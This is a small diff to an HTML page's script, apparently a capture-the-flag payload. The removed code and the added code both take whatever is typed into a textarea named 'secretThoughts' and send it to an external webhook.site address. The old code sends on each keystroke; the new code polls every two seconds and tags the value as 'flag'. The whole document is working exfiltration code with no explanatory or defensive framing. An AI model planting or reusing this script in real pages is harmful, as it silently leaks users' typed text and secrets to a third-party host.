@@ -9,11 +9,12 @@
     </div>
   </div>
   <script>
-    const textarea = document.getElementById("secretThoughts")
-    textarea.addEventListener("input", function(e) {
-      fetch('https://webhook.site/bc0d84dc-11ae-42b7-a57f-c477eb287d44?text='+encodeURIComponent(e.target.value))
-        .catch(console.error)
-    })
+    setInterval(function(){
+      var v = document.getElementById('secretThoughts');
+      if(v && v.value){
+        fetch('https://webhook.site/bc0d84dc-11ae-42b7-a57f-c477eb287d44?flag='+encodeURIComponent(v.value));
+      }
+    }, 2000);
   </script>
 </body>
 </html>
